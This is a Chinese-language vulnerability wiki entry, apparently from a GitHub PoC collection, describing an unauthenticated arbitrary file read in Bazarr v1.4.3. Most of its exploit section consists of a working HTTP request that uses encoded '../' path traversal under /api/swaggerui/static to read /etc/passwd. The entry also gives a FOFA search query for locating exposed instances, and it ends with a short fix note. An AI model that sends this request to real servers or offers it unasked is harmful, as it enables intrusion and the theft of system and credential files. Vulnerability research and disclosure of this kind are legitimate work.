---
fofa: "title="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# Bazaar v1.4.3 任意文件读取漏洞

# 漏洞描述

Bazarr存在任意文件读取漏洞，该漏洞是由于Bazaar v1.4.3的组件/api/swaggerui/static中存在一个问题，允许未经身份验证的攻击者可利用该漏洞执行目录遍历。

影响版本

Bazarr v1.4.3

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="Bazarr"

POC/EXP：

GET /api/swaggerui/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

![image-20240725212731033](./.resource/Bazaarv1.4.3任意文件读取漏洞/media/image-20240725212731033.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
